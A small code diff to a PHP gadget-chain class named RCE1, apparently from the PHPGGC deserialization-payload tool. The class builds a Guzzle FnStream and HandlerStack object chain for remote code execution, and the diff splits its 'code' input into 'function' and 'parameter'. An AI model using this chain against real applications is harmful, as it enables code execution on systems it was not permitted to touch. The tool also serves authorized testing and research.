@@ -12,11 +12,12 @@ class RCE1 extends \PHPGGC\GadgetChain\RCE
 
     public function generate(array $parameters)
     {
-        $code = $parameters['code'];
+        $function = $parameters['function'];
+        $parameter = $parameters['parameter'];
 
         return new \GuzzleHttp\Psr7\FnStream([
             'close' => [
-                new \GuzzleHttp\HandlerStack($code),
+                new \GuzzleHttp\HandlerStack($function, $parameter),
                 'resolve'
             ]
         ]);
